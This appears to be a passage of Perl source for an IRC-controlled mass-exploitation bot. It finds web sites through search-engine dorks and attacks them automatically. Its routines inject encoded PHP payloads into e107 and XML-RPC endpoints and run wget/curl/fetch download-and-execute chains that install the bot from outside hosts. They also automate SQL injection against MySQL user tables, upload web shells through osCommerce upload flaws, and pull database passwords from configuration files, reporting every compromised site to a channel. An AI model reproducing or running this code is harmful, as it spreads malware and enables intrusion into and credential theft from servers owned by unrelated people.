QgIi4kaW5qZWN0b3IuIiBwYi5waHAgJiYgY2htb2QgNzU1IHBiLnBocCAmJiBybSAtcmYgcGIucGhwLiogJiYgcGhwIHBiLnBocCAmJiBsd3AtZG93bmxvYWQgIi4kYm90c2hlbGwuIiBoNHJkLnBocCAmJiBjaG1vZCA3NTUgaDRyZC5waHAgJiYgcm0gLXJmIGg0cmQucGhwLioiKTsNCn0=";
   my $cmd = "eval(base64_decode('".$cod2."'));eval(base64_decode('".$code."'));eval(include('".$injector."'));";
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type("application/x-www-form-urlencoded");
    $req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd.$b0tcmd ."%3Bdie%28%29%3B%5B%2Fphp%5D");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $res = $ua->request($req);
    return $res->content;
}

sub e107_spread_query() {
    my $url = $_[0];
    my $code = "ZWNobyAidjBwQ3Izdzxicj4iOw0KZWNobyAic3lzOiIucGhwX3VuYW1lKCkuIjxicj4iOw0KJGNtZD0iZWNobyBub2IwZHlDcjN3IjsNCiRlc2VndWljbWQ9ZXgoJGNtZCk7DQplY2hvICRlc2VndWljbWQ7DQpmdW5jdGlvbiBleCgkY2ZlKXsNCiRyZXMgPSAnJzsNCmlmICghZW1wdHkoJGNmZSkpew0KaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpew0KQGV4ZWMoJGNmZSwkcmVzKTsNCiRyZXMgPSBqb2luKCJcbiIsJHJlcyk7DQp9DQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpew0KJHJlcyA9IEBzaGVsbF9leGVjKCRjZmUpOw0KfQ0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpew0KQG9iX3N0YXJ0KCk7DQpAc3lzdGVtKCRjZmUpOw0KJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsNCkBvYl9lbmRfY2xlYW4oKTsNCn0NCmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1Jykpew0KQG9iX3N0YXJ0KCk7DQpAcGFzc3RocnUoJGNmZSk7DQokcmVzID0gQG9iX2dldF9jb250ZW50cygpOw0KQG9iX2VuZF9jbGVhbigpOw0KfQ0KZWxzZWlmKEBpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkY2ZlLCJyIikpKXsNCiRyZXMgPSAiIjsNCndoaWxlKCFAZmVvZigkZikpIHsgJHJlcyAuPSBAZnJlYWQoJGYsMTAyNCk7IH0NCkBwY2xvc2UoJGYpOw0KfX0NCnJldHVybiAkcmVzOw0KfQ==";
    my $cmd = "eval(base64_decode('".$cod2."'));eval(base64_decode('".$code."'));eval(include('".$injector."'));";
   my $req = HTTP::Request->new(POST => $url);
    $req->content_type("application/x-www-form-urlencoded");
    $req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd.$b0tcmd ."%3Bdie%28%29%3B%5B%2Fphp%5D");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $res = $ua->request($req);
}

######################## xml
sub xml() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$xmllogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$xmllogo 12(4@0$engine12) 11==14F11=15I11=0N11=0I11=15S11=14H11== "); } }
            my $test = "http://".$site.$bug;
            my $vuln = "http://".$site."12".$bug;
            my $html = &get_content($test);
            if ($html =~ /faultCode/ ) {
            if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            my $resp = &xml_cek_query($test);
         if ($resp =~ /pVd5c9pIFv97XeXv0NFm/s) {
         &xml_spread_query($test);sleep(2);
         my $sys = $1;
         my $check = &get_content("http://".$site."h4rd.php");
            if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/) {
            &msg("$chan","$xmllogo 12(4@0$engine12)(4@8SHELL12)13 http://".$site."13h4rd.php 8".$sys);&get_content("http://".$site."pb.php"); sleep(2);}
            else {
            &msg("$chan","$xmllogo 12(4@0$engine12)(4@7SYSTEM12)11 ".$vuln." 8".$sys); sleep(2);}
         }
   sleep(2); } exit; } }
      }
   }
}

sub xml_cek_query() {
    my $url    = $_[0];
   my $code = "system('uname -a'); eval(include('".$injector."'));";
    my $ua = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'pVd5c9pIFv97XeXv0NFm';".$code."echo'pVd5c9pIFv97XeXv0NFm';exit;/*</name></value></param></params></methodCall>";
   $ua->timeout(7);
   my $res = $ua->request(POST $url, Content_Type => 'text/xml', Content => $exploit);
    return $res->content;
}

sub xml_spread_query() {
my $xmltargt = $_[0];
my $xmlsprd  = "exec('cd /tmp; wget ".$injector." -O pb.php; chmod 755 pb.php; php pb.php; fetch -O pb.php ".$injector."; chmod 755 pb.php; php pb.php; cUrl -O pb.php ".$injector."; chmod 755 pb.php; php pb.php; lynx -dump ".$injector." pb.php; chmod 755 pb.php; php pb.php; GET ".$injector.">pb.php; chmod 755 pb.php; php pb.php; lwp-download ".$injector." pb.php; chmod 755 pb.php; php pb.php; wget ".$botak." -O sb.txt; chmod 755 sb.txt; perl sb.txt; fetch -O sb.txt ".$botak."; chmod 755 sb.txt; perl sb.txt; cUrl -O sb.txt ".$botak."; chmod 755 sb.txt; perl sb.txt; lynx -dump ".$botak." sb.txt; chmod 755 sb.txt; perl sb.txt; GET ".$botak.">sb.txt; chmod 755 sb.txt; perl sb.txt; lwp-download ".$botak." sb.txt; chmod 755 sb.txt; perl sb.txt*'); shell_exec('cd /tmp; wget ".$injector." -O pb.php; chmod 755 pb.php; php pb.php; fetch -O pb.php ".$injector."; chmod 755 pb.php; php pb.php; cUrl -O pb.php ".$injector."; chmod 755 pb.php; php pb.php; lynx -dump ".$injector." pb.php; chmod 755 pb.php; php pb.php; GET ".$injector.">pb.php; chmod 755 pb.php; php pb.php; lwp-download ".$injector." pb.php; chmod 755 pb.php; php pb.php; wget ".$botak." -O sb.txt; chmod 755 sb.txt; perl sb.txt; fetch -O sb.txt ".$botak."; chmod 755 sb.txt; perl sb.txt; cUrl -O sb.txt ".$botak."; chmod 755 sb.txt; perl sb.txt; lynx -dump ".$botak." sb.txt; chmod 755 sb.txt; perl sb.txt; GET ".$botak.">sb.txt; chmod 755 sb.txt; perl sb.txt; lwp-download ".$botak." sb.txt; chmod 755 sb.txt; perl sb.txt*'); system('cd /tmp; wget ".$injector." -O pb.php; chmod 755 pb.php; php pb.php; fetch -O pb.php ".$injector."; chmod 755 pb.php; php pb.php; cUrl -O pb.php ".$injector."; chmod 755 pb.php; php pb.php; lynx -dump ".$injector." pb.php; chmod 755 pb.php; php pb.php; GET ".$injector.">pb.php; chmod 755 pb.php; php pb.php; lwp-download ".$injector." pb.php; chmod 755 pb.php; php pb.php; wget ".$botak." -O sb.txt; chmod 755 sb.txt; perl sb.txt; fetch -O sb.txt ".$botak."; chmod 755 sb.txt; perl sb.txt; cUrl -O sb.txt ".$botak."; chmod 755 sb.txt; perl sb.txt; lynx -dump ".$botak." sb.txt; chmod 755 sb.txt; perl sb.txt; GET ".$botak.">sb.txt; chmod 755 sb.txt; perl sb.txt; lwp-download ".$botak." sb.txt; chmod 755 sb.txt; perl sb.txt*');  passthru('cd /tmp; wget ".$injector." -O pb.php; chmod 755 pb.php; php pb.php; fetch -O pb.php ".$injector."; chmod 755 pb.php; php pb.php; cUrl -O pb.php ".$injector."; chmod 755 pb.php; php pb.php; lynx -dump ".$injector." pb.php; chmod 755 pb.php; php pb.php; GET ".$injector.">pb.php; chmod 755 pb.php; php pb.php; lwp-download ".$injector." pb.php; chmod 755 pb.php; php pb.php; wget ".$botak." -O sb.txt; chmod 755 sb.txt; perl sb.txt; fetch -O sb.txt ".$botak."; chmod 755 sb.txt; perl sb.txt; cUrl -O sb.txt ".$botak."; chmod 755 sb.txt; perl sb.txt; lynx -dump ".$botak." sb.txt; chmod 755 sb.txt; perl sb.txt; GET ".$botak.">sb.txt; chmod 755 sb.txt; perl sb.txt; lwp-download ".$botak." sb.txt; chmod 755 sb.txt; perl sb.txt*'); eval(include('".$injector."'));";
      my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'pVd5c9pIFv97XeXv0NFm';".$xmlsprd."echo'pVd5c9pIFv97XeXv0NFm';exit;/*</name></value></param></params></methodCall>";
   $userAgent->timeout(7);
my $response = $userAgent->request(POST $xmltargt, Content_Type => 'text/xml', Content => $exploit);
}

######################## SQL
sub sql() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$sqllogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$sqllogo 12(4@0$engine12) 7==14F7=15I7=0N7=0I7=14S7=14H7== "); } }
            my $test = "http://".$site.$bug."'";
            my $vuln = "http://".$site."12".$bug;
         my $sqlsite = "http://".$site.$bug;
            my $html = &get_content($test);
         if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ m/You have an error in your SQL syntax/i || $html =~ m/Query failed/i || $html =~ m/SQL query failed/i ) {
                &sqlbrute($sqlsite,$chan,$engine);}
            elsif ($html =~ m/ODBC SQL Server Driver/i || $html =~ m/Unclosed quotation mark/i || $html =~ m/Microsoft OLE DB Provider for/i ) {
                &msg("$chan","0,1$sqllogo(4@0$engine15)15(13@12MsSQL15)4 ".$vuln);&sqlbrute($sqlsite,$chan,$engine);}
            elsif ($html =~ m/Microsoft JET Database/i || $html =~ m/ODBC Microsoft Access Driver/i || $html =~ m/Microsoft OLE DB Provider for Oracle/i ) {
                &msg("$chan","0,1$sqllogo(4@0$engine15)15(13@12MsAccess15)4 ".$vuln);&sqlbrute($sqlsite,$chan,$engine);}
            elsif ($html =~ m/mysql_/i || $html =~ m/Division by zero in/i || $html =~ m/mysql_fetch_array/i ) {
                &sqlbrute($sqlsite,$chan,$engine);}
            } exit; sleep(2); }
        }
    }
}
sub sqlbrute() {
         my $situs=$_[0];
         my $chan  =$_[1];
         my $engine=$_[2];
         my $columns=35;
my $cfin.="--";
my $cmn.= "+";
for ($column = 0 ; $column < $columns ; $column ++)
   {
   $union.=','.$column;
   $inyection.=','."0x6c6f67696e70776e7a";
    if ($column == 0)
      {
        $inyection = '';
          $union = '';
      }
    $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cfin;
    $response=get($sql);
    if($response =~ /loginpwnz/)
      {
         $column ++;
         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;
       &msg("$chan","0,1$sqllogo(4@0$engine15)15(4@12SQL15)3 $sql  ");
         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;
         $response=get($sql)or die("[-] Impossible to get Information_Schema\n");
         if($response =~ /loginpwnz/)
            {
            $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."information_schema.tables".$cfin;
         &msg("$chan","0,1$sqllogo(4@0$engine15)15(4@12SQL15)(4@14INFO_SCHEMA15)3 $sql  ");
            }
         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."mysql.user".$cfin;
         $response=get($sql)or die("[-] Impossible to get MySQL.User\n");
         if($response =~ /loginpwnz/)
            {
            $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."mysql.user".$cfin;
         &msg("$chan","0,1$sqllogo(4@0$engine15)15(4@12SQL15)(4@14USER15)3 $sql  ");
            }
         else
            {
            }
   while ($loadcont < $column-1)
      {
      $loadfile.=','.'load_file(0x2f70726f632f73656c662f656e7669726f6e2530303030696e636c7564652822687474703a2f2f626c6f672e737369732e6564752e766e2f2e6d6f64732f70626f742e7478743f22293b)';
      $loadcont++;
      }
      $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."load_file(0x2f70726f632f73656c662f656e7669726f6e2530303030696e636c7564652822687474703a2f2f626c6f672e737369732e6564752e766e2f2e6d6f64732f70626f742e7478743f22293b)".$loadfile.$cfin;
     $response=get($sql)or die("[-] Impossible to inject LOAD_FILE\n");
         if($response =~ /apache/)
            {
         &msg("$chan","0,1$sqllogo(4@0$engine15)15(4@12SQL15)(4@14Load File15)3 $sql  ");
         }
         else
            {
            }
             foreach $tabla(@tabele)
                {
                  chomp($tabla);
                  $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn.$tabla.$cfin;
             $response=get($sql)or die("[-] Impossible to get tables\n");
                  if($response =~ /loginpwnz/)
                    {
                    $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn.$tabla.$cfin;
               &msg("$chan","0,1$sqllogo(4@0$engine15)15(4@12SQL15)(4@14Tabel15)3 $sql  ");
               &tabelka($situs,$tabla,$chan,$engine);
                    }
                }
      }
   }         
}

sub tabelka() {
         my $situs =$_[0];
         my $tabla =$_[1];
         my $chan  =$_[2];
         my $engine=$_[3];
         my $cfin.="--";
         my $cmn.= "+";
            chomp($tabla);
            foreach $columna(@kolumny)
            {
             chomp($columna);
             $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."concat(0x6c6f67696e70776e7a,0x3a,$columna)".$inyection.$cmn."from".$cmn.$tabla.$cfin;
             $response=get($sql)or die("[-] Impossible to get columns\n");
             if ($response =~ /loginpwnz/)
                {
            &msg("$chan","0,1$sqllogo(4@0$engine15)15(4@12SQL15)(7@14SQLi Vuln14)3 $situs 14(4@14Kolom14)3 $columna 14(4@14Tabel14)3 $tabla  ");
                }
            }
       
}

######################## Cpanel
sub cpanel() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$cpanlogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
     if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$cpanlogo 12(4@0$engine12) 4==14F4=15I4=0N4=0I4=15S4=14H4== "); } }
            my $test = "http://".$site.$bug;
         my $zine = "http://".$site."admin/content.php?act=tambahuser";
            my $re    = &get_content($zine);
           if ($re =~ /<input type=text name=nama_lengkap size=30>/){
         &msg("$chan","$cpanlogo 12(4@0$engine12)(4@8OK4]9 http://".$site."4admin/content.php?act=tambahuser");sleep(2);
            }
      }
    }
}
sub cpanel2() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;   
    my @list = &search_engine($chan,$bug,$dork,$engine,$cpanlogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
     if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$cpanlogo 12(4@0$engine12) 4==14F4=15I4=0N4=0I4=15S4=14H4== "); } }
            my $test = "http://".$site.$bug;
         my $zine = "http://".$site."admin/content.php?module=user";
            my $re    = &get_content($zine);
           if ($re =~ /<input type=submit value='Tambah User'>/){
         &msg("$chan","$cpanlogo 12(4@0$engine12)(4@8OK4]9 http://".$site."4admin/content.php?act=tambahuser");sleep(2);
            }
      }
    }
}

######################## PHPmyadmin
sub adm() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$admlogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$admlogo 12(4@0$engine12) 11==14F11=15I11=0N11=0I11=15S11=14H11== "); } }
            my $test  = "http://".$site."phpMyAdmin/config/config.inc.php?c=id";
            my $vuln = "http://".$site."phpMyAdmin/config/config.inc.php?c=4[cmd]s";
            my $re   = &get_content($test);
            if ($re =~ /$adm_output/){
            &msg("$chan", "$admlogo 12(4@0$engine12)(4@12VulN15)12 ".$vuln."15(4@0OKE15)");
            }
         }
    }
}

######################## OSCO
sub osco() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$oscologo12(4@0$engine12) 4==14F4=15I4=0N4=0I4=15S4=14H4=="); } }
            my $test = "http://".$site.$bug;
         my $test1 = "http://".$site."admin/file_manager.php/login.php";
            my $test2 = "http://".$site."admin/banner_manager.php/login.php";
         my $test3 = "http://".$site."admin/categories.php/login.php?cPath=&action=new_product_preview";
            my $html = &get_content($test);
         if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ /TABLE_HEADING_CATEGORIES_PRODUCTS/ ) {
         if ($conf{soscos} == 1) {
            &msg("$chan","$oscologo12(4@0$engine12)(4@7SYSTEM12)11 ".$test);
         }
            &osco_xpl1($test,$chan,$site,$engine);
            &osco_xpl2($test1,$chan,$site,$engine);
            &osco_xpl3($test2,$chan,$site,$engine);
            &osco_xpl4($test3,$chan,$site,$engine);
            &osql($chan,$site,$engine);
            } else { }
            } exit; sleep(2); }
        }
    }
}

sub osco_xpl1() {
my $browser = LWP::UserAgent->new;
my $url    = $_[0]."?cPath=&action=new_product_preview";
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $res = $browser->post( $url,['products_image' => ['./sh.jpg' => 'h4rd.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resa = $browser->post( $url,['products_image' => ['./pbot.jpg' => 'pb.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resb = $browser->post( $url,['products_image' => ['./sl.jpg' => 'SQL_Manager.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resc = $browser->post( $url,['products_image' => ['./sh.jpg' => '../h4rd.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resd = $browser->post( $url,['products_image' => ['./sh.jpg' => '../includes/h4rd.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
   my $hasil = $res->as_string;
   my $hasil1 = $resa->as_string;
   my $hasil2 = $resb->as_string;
   my $hasil3 = $resc->as_string;
   my $hasil4 = $resd->as_string;
   sleep(5);
   &osco_shell_check($url,$chan,$site,$engine);
}

sub osco2() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$oscologo12(4@0$engine12) 4==14F4=15I4=0N4=0I4=15S4=14H4=="); } }
            my $test = "http://".$site.$bug;
            my $test1 = "http://".$site."admin/banner_manager.php/login.php";
         my $test2 = "http://".$site."admin/categories.php/login.php?cPath=&action=new_product_preview";
         my $test3 = "http://".$site."admin/categories.php/login.php";
            my $html = &get_content($test);
         if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ /TABLE_HEADING_FILENAME/) {
         if ($conf{soscos} == 1) {
                &msg("$chan","$oscologo12(4@0$engine12)(4@7SYSTEM12)11 ".$test);
         }
            &osco_xpl2($test,$chan,$site,$engine);
            &osco_xpl3($test1,$chan,$site,$engine);
            &osco_xpl4($test2,$chan,$site,$engine);
            &osco_xpl1($test3,$chan,$site,$engine);
                &osql($chan,$site,$engine);
            } else { }
            } exit; sleep(2); }
        }
    }
}

sub osco_xpl2() {
my $browser = LWP::UserAgent->new;
my $url    = $_[0]."?action=processuploads";
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $res = $browser->post( $url,['file_1' => ['./sh.jpg' => 'h4rd.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resa = $browser->post( $url,['file_1' => ['./pbot.jpg' => 'pb.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resb = $browser->post( $url,['file_1' => ['./sl.jpg' => 'SQL_Manager.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resc = $browser->post( $url,['file_1' => ['./sh.jpg' => '../h4rd.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resd = $browser->post( $url,['file_1' => ['./sh.jpg' => '../includes/h4rd.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
   my $hasil = $res->as_string;
   my $hasil1 = $resa->as_string;
   my $hasil2 = $resb->as_string;
   my $hasil3 = $resc->as_string;
   my $hasil4 = $resd->as_string;
   sleep(5);
   &osco_shell_check($url,$chan,$site,$engine);
}

sub osco3() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$oscologo12(4@0$engine12) 4==14F4=15I4=0N4=0I4=15S4=14H4=="); } }
            my $test = "http://".$site.$bug;
         my $test1 = "http://".$site."admin/categories.php/login.php?cPath=&action=new_product_preview";
         my $test2 = "http://".$site."admin/categories.php/login.php";
         my $test3 = "http://".$site."admin/file_manager.php/login.php";
            my $html = &get_content($test);
         if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ /TABLE_HEADING_BANNERS/) {
         if ($conf{soscos} == 1) {
                &msg("$chan","$oscologo12(4@0$engine12)(4@7SYSTEM12)11 ".$test);
         }
            &osco_xpl3($test,$chan,$site,$engine);
            &osco_xpl4($test1,$chan,$site,$engine);
            &osco_xpl1($test2,$chan,$site,$engine);
            &osco_xpl2($test3,$chan,$site,$engine);
                &osql($chan,$site,$engine);
            } else { }
            } exit; sleep(2); }
      }
    }
}

sub osco_xpl3() {
my $browser = LWP::UserAgent->new;
my $url    = $_[0]."?action=insert";
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $res = $browser->post( $url,['banners_image' => ['./sh.jpg' => 'h4rd.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resa = $browser->post( $url,['banners_image' => ['./pbot.jpg' => 'pb.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resb = $browser->post( $url,['banners_image' => ['./sl.jpg' => 'SQL_Manager.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resc = $browser->post( $url,['banners_image' => ['./sh.jpg' => '../h4rd.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resd = $browser->post( $url,['banners_image' => ['./sh.jpg' => '../includes/h4rd.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
   my $hasil = $res->as_string;
   my $hasil1 = $resa->as_string;
   my $hasil2 = $resb->as_string;
   my $hasil3 = $resc->as_string;
   my $hasil4 = $resd->as_string;
   sleep(5);
   &osco_shell_check($url,$chan,$site,$engine);
}


sub osco4() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$oscologo12(4@0$engine12) 4==14F4=15I4=0N4=0I4=15S4=14H4=="); } }
            my $test = "http://".$site.$bug;
         my $test1 = "http://".$site."admin/categories.php/login.php";
         my $test2 = "http://".$site."admin/file_manager.php/login.php";
         my $test3 = "http://".$site."admin/banner_manager.php/login.php";
            my $html = &get_content($test);
         if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ /Warning: No file uploaded/ ) {
         if ($conf{soscos} == 1) {
                &msg("$chan","$oscologo12(4@0$engine12)(4@7SYSTEM12)11 ".$test);
         }
            &osco_xpl4($test,$chan,$site,$engine);
            &osco_xpl1($test1,$chan,$site,$engine);
            &osco_xpl2($test2,$chan,$site,$engine);
            &osco_xpl3($test3,$chan,$site,$engine);
            } else { }
            } exit; sleep(2); }
        }
    }
}
sub osco_xpl4() {
my $browser = LWP::UserAgent->new;
my $url    = $_[0];
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $res  = $browser->post( $url,['products_image' => ['./sh.jpg' => 'h4rd.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resa = $browser->post( $url,['products_image' => ['./pbot.jpg' => 'pb.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resb = $browser->post( $url,['products_image' => ['./sl.jpg' => 'SQL_Manager.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resc  = $browser->post( $url,['products_image' => ['./sh.jpg' => '../h4rd.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resd  = $browser->post( $url,['products_image' => ['./sh.jpg' => '../includes/h4rd.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
    my $hasil = $res->as_string;
   my $hasil1 = $resa->as_string;
   my $hasil2 = $resb->as_string;
   my $hasil3 = $resc->as_string;
   my $hasil4 = $resd->as_string;
   sleep(5);
   &osco_shell_check($url,$chan,$site,$engine);
}


sub osco_shell_check() {
my $url    = $_[0];
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $check0 = &get_content("http://".$site."images/h4rd.php");
my $check1 = &get_content("http://".$site."admin/h4rd.php");
my $check2 = &get_content("http://".$site."h4rd.php");
my $check3 = &get_content("http://".$site."includes/h4rd.php");
$urli0 = "http://".$site."images/h4rd.php";
$urli1 = "http://".$site."admin/h4rd.php";
$urli2 = "http://".$site."h4rd.php";
$urli3 = "http://".$site."includes/h4rd.php";

    if ($check0 =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) {
   &info_main($urli0,$chan,$engine,$oscologo);
   }
   &get_content("http://".$site."images/pb.php");
   &get_content("http://".$site."images/SQL_Manager.php");
   sleep(2);
      if ($check1 =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) {
      &info_main($urli1,$chan,$engine,$oscologo);
      }
      &get_content("http://".$site."admin/pb.php");
      &get_content("http://".$site."admin/SQL_Manager.php");
      sleep(2);
         if ($check2 =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) {
         &info_main($urli2,$chan,$engine,$oscologo);
         }
         &get_content("http://".$site."pb.php");
         &get_content("http://".$site."SQL_Manager.php");
         sleep(2);
            if ($check3 =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) {
            &info_main($urli3,$chan,$engine,$oscologo);
            }
}

sub osql() {
    my $chan   = $_[0];
    my $site   = $_[1];
    my $engine = $_[2];
      my $test = "http://".$site."admin/file_manager.php/login.php?action=download&filename=/includes/configure.php";
      my $re   = &get_content($test);
         if ($re =~ /http:\/\//){
            &osql_xpl($test,$chan,$engine,$site);
        }
 }

sub osql_xpl() {
     my $url    = $_[0];
     my $chan   = $_[1];
    my $engine = $_[2];
     my $site   = $_[3];
     my $request   = HTTP::Request->new(GET=>$url);
     my $browser   = LWP::UserAgent->new();
        $browser->timeout(17);
        my $response  = $browser->request($request);
         if ($response->is_success) {
         my $dbinfo = "";
         my $res   = $response->as_string;
           if ($res =~ m/'DIR_FS_CATALOG', '(.*)'/g) {
            $dbinfo = $dbinfo."14[+]pth:4 $1 ";
             $odbi[0] = "1";
           }
           if ($res =~ m/'DB_SERVER', '(.*)'/g) {
           if ($1 eq "localhost") { $clr = "4 "; }
           elsif ($1 eq "localhost:3306") { $clr = "4 "; }
           elsif ($1 eq "127.0.0.1") { $clr = "4 "; }
           else { $clr = "12 "; }
            $dbinfo = $dbinfo."14[+]srv:".$clr.$1." ";
            $odbi[1] = "1";
           }
           if ($res =~ m/'DB_SERVER_USERNAME', '(.*)'/g) {
            $dbinfo = $dbinfo."14[+]usr:4 $1 ";
            $odbi[2] = "1";
           }
           if ($res =~ m/'DB_SERVER_PASSWORD', '(.*)'/g) {
            $dbinfo = $dbinfo."14[+]pwd:4 $1 ";
            $odbi[3] = "1";
           }
           if ($res =~ m/'DB_DATABASE', '(.*)'/g) {
            $dbinfo = $dbinfo."14[+]db:4 $1 ";
            $odbi[4] = "1";
           }
            if ($odbi[0] == "1" && $odbi[1] == "1" && $odbi[2] == "1" && $odbi[3] == "1" && $odbi[4] == "1") {
               &msg("$chan","$ossqllogo12(4@0$engine12)12(4@3VULN12)4 http://".$site." ".$dbinfo." ");
            }   
       }
}

######################## OpenCart
sub op() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oplogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$oplogo(4@5$engine15)12 Scan finish"); } }
            my $test  = "http://".$site.$open_test;
            my $vuln = "http://".$site."admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html";
            my $re   = &get_content($test);
            if ($re =~ /$open_output/){
            &msg("$chan", "$oplogo(4@5$engine15)(4@12VulN15)13 ".$vuln."15(4@UPLOAD15)");
            }
        }
    }
}

